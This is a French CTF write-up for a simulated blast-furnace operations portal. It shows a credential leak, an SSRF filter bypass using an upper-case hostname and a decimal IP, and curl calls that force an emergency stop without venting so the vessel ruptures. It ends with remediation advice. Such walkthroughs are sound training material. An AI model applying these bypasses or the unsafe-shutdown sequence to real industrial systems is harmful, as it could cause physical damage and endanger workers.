# OT#003 — Blast Furnace Remote Operations Portal

**Auteur :** lyons

**Challenge** : OT#003  
**Serveur distant** : `<HOST>:<PORT>`  
**Catégorie** : Web / OT / SSRF  
**Flag** : `CTF{REDACTED}`

---

## Vue d'ensemble du challenge

Un portail d'exploitation à distance d'un haut-fourneau, exposé sur le réseau de l'entreprise. Le système de contrôle du four lui-même n'est jamais joignable en direct — ce portail web constitue l'unique porte d'entrée. Le challenge mobilise :

1. **La fuite d'identifiants** par des fichiers publics
2. **Le contournement d'un filtre SSRF** via la casse et l'encodage d'IP
3. **La rupture de l'enveloppe** provoquée par un arrêt non maîtrisé

---

## 1. Fuite d'identifiants

### Endpoint : GET `/commissioning-notes.txt`

Les notes de mise en service, exposées publiquement, dévoilent les identifiants opérateur par défaut :

```
operator / St33lW0rks!2024
```

Ces identifiants resservent ensuite pour authentifier les requêtes SSRF.

---

## 2. Contournement du filtre SSRF

### Vulnérabilité : filtrage trop restrictif

L'endpoint d'intégration des capteurs (`POST /ops/test-sensor`) bloque les plages IPv4 privées ainsi qu'un nom d'hôte :

**Motifs bloqués** (sensible à la casse) :
- `127.*` (interface de boucle locale)
- `10.*` (réseau privé)
- `172.*` (réseau privé)
- `192.168.*` (réseau privé)
- `localhost` (correspondance exacte en minuscules)

**Techniques de contournement** :

#### Méthode 1 : nom d'hôte en majuscules
```
http://FURNACE:4000/
```
Le filtre ne compare que `furnace` en minuscules ; la forme majuscule passe au travers.

#### Méthode 2 : encodage décimal/hexadécimal de l'IP
Pour l'IP `172.25.0.2:4000` :
- Forme canonique : `http://172.25.0.2:4000/` → **bloquée** (colle au motif `172.*`)
- Forme décimale : `http://2887770626:4000/` (172*256³ + 25*256² + 0*256 + 2)
- Le filtre ne passe au crible que la notation pointée, pas les représentations numériques

#### Mise en œuvre
Grâce à leurs divergences d'analyse d'URI, le portail **comme** le système de contrôle du four acceptent tous deux cette requête.

---

## 3. État du four et décompression

### Endpoint : GET `/status` (via SSRF)

```bash
curl -H "X-Session-Id: <sid>" 'http://furnace:4000/status'
```

Réponse :
```json
{
  "temperature": 1550,
  "pressure": 92,
  "vented": false,
  "ruptured": false
}
```

**Paramètres critiques** :
- `temperature` : 1550°C (élevée, on frôle le critique)
- `pressure` : 92 PSI (haute)
- `vented` : false (aucune décompression déclenchée)
- `ruptured` : false (l'enveloppe tient)

### Endpoint : POST `/vent`

Décompresse proprement la pression avant l'arrêt d'urgence :

```bash
curl -X POST -H "X-Session-Id: <sid>" 'http://furnace:4000/vent'
```

Réponse : `{"vented": true}`

État après décompression :
```json
{
  "temperature": 1550,
  "pressure": 35,      // ← pressure drops safely
  "vented": true,
  "ruptured": false
}
```

---

## 4. Rupture de l'enveloppe via arrêt d'urgence incontrôlé

### Endpoint : POST `/emergency_stop`

Le comportement de l'arrêt d'urgence **dépend de l'état de décompression** :

#### Scénario A : arrêt sûr (après décompression)
```bash
curl -X POST -H "X-Session-Id: <sid>" 'http://furnace:4000/vent'
curl -X POST -H "X-Session-Id: <sid>" 'http://furnace:4000/emergency_stop'
```

Réponse : `"Furnace stopped safely."`

État : `ruptured: false`

#### Scénario B : arrêt incontrôlé (sans décompression)
```bash
curl -X POST -H "X-Session-Id: <sid>" 'http://furnace:4000/emergency_stop'
```

Réponse : `"Uncontrolled shutdown with pressure still high: vessel ruptured."`

État : `ruptured: true` ← **flag exposé**

**Physique** : stopper sans avoir décomprimé condamne le circuit de pression à une défaillance catastrophique. C'est l'événement de rupture qui débloque l'accès au flag.

---

## 5. Extraction du flag

### Endpoint : GET `/status` (après rupture)

Une fois l'enveloppe rompue, la réponse de status embarque le flag :

```bash
curl -H "X-Session-Id: <sid>" 'http://furnace:4000/status'
```

Réponse (après rupture) :
```json
{
  "temperature": 1550,
  "pressure": 92,
  "vented": false,
  "ruptured": true,
  "flag": "CTF{...}"
}
```

---

## 6. Chaîne d'exploitation complète

```
1. GET /commissioning-notes.txt
   → Leak credentials: operator / St33lW0rks!2024

2. POST /login
   → Authenticate, obtain X-Session-Id

3. POST /ops/test-sensor (SSRF bypass)
   → Use http://FURNACE:4000/ or decimal IP
   → Furnace control is now accessible

4. GET http://furnace:4000/status
   → Verify furnace state (temp, pressure, vented, ruptured)

5. POST http://furnace:4000/emergency_stop (NO VENTING)
   → Trigger uncontrolled shutdown
   → Response: "Uncontrolled shutdown with pressure still high: vessel ruptured."

6. GET http://furnace:4000/status
   → Extract flag from ruptured: true response

Result: CTF{...}
```

---

## 7. Points à retenir

- **Fragilité du filtre** : contrôle du nom d'hôte sensible à la casse (`furnace` vs `FURNACE`)
- **Encodage d'IP** : les écritures décimale/hexadécimale échappent au filtrage par motifs
- **Propagation de session** : la requête SSRF embarque les identifiants de l'opérateur (en-tête X-Session-Id)
- **Défaut de logique** : le four accepte emergency_stop sans décompression préalable, d'où la rupture
- **Verrou du flag** : l'état de rupture libère le flag dans l'endpoint de status

---

## 8. Remédiation

1. **Filtrage SSRF** : adopter une allowlist (correspondance exacte, tous les encodages d'IP)
2. **Comparaisons insensibles à la casse** : normaliser les noms d'hôte en minuscules avant filtrage
3. **Durcissement des identifiants** : faire tourner les identifiants par défaut et les retirer des fichiers publics
4. **Isolement des sessions** : borner chaque jeton de session à des opérations précises ; ne pas le propager vers des systèmes externes
5. **Garantie d'état sûr** : exiger la décompression avant tout arrêt d'urgence ; valider la logique du four
